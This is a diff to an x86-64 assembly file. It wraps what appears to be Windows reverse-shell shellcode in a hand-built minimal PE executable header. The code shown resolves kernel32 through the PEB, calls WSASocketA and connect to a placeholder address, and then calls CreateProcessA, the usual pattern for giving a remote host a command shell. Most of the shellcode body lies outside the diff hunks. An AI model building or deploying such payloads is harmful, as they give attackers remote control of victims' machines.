@@ -5,6 +5,56 @@ BITS 64
 ; in a local address region that is comfortable with the
 ; code crashing (executable program).
 
+        DW      'MZ'
+        DW      0
+
+PE_HEADER:
+        DW      'PE'
+        DW      0
+        DW      0x8664
+        DW      0
+        DD      0x656c6973
+        DD      0x7369746e
+        DD      0
+        DW      OPTIONAL_HEADERS_LENGTH
+        DW      0x22
+
+OPTIONAL_HEADERS:
+        DW      0x020b
+        DB      0
+        DB      0
+        DD      CODE_LENGTH
+        DD      0
+        DD      0
+        DD      ENTRY
+        DD      0
+        DQ      0x000140000000
+        DD      PE_HEADER
+        DD      0x04
+        DW      0
+        DW      0
+        DW      0
+        DW      0
+        DW      0x06
+        DW      0
+        DD      0
+        DD      FILE_LENGTH
+        DD      0x8b
+        DD      0
+        DW      0x02
+        DW      0
+        DQ      0
+        DQ      0
+        DQ      0
+        DQ      0
+        DQ      0
+        DQ      0
+        DQ      0
+
+OPTIONAL_HEADERS_LENGTH equ $-OPTIONAL_HEADERS
+
+ENTRY:
+
 GET_KERNEL32:
         MOV     RAX,    GS:[0x60]
         MOV     RAX,    [RAX + 0x18]
@@ -52,7 +102,7 @@ RUN_WSASOCKETA:
 
 RUN_CONNECT:
         MOV     ECX,    EAX
-        MOV     RAX,    0xcccccccccccc0002
+        MOV     RAX,    0xXXXXXXXXXXXX0002
         PUSH    RAX
         MOV     EDX,    ESP
         MOV     R8B,    0x10
@@ -88,3 +138,6 @@ RUN_CREATEPROCESSA:
         PUSH    RAX
         MOV     ECX,   EAX
         CALL    R15
+
+CODE_LENGTH equ $-ENTRY
+FILE_LENGTH equ $-$$
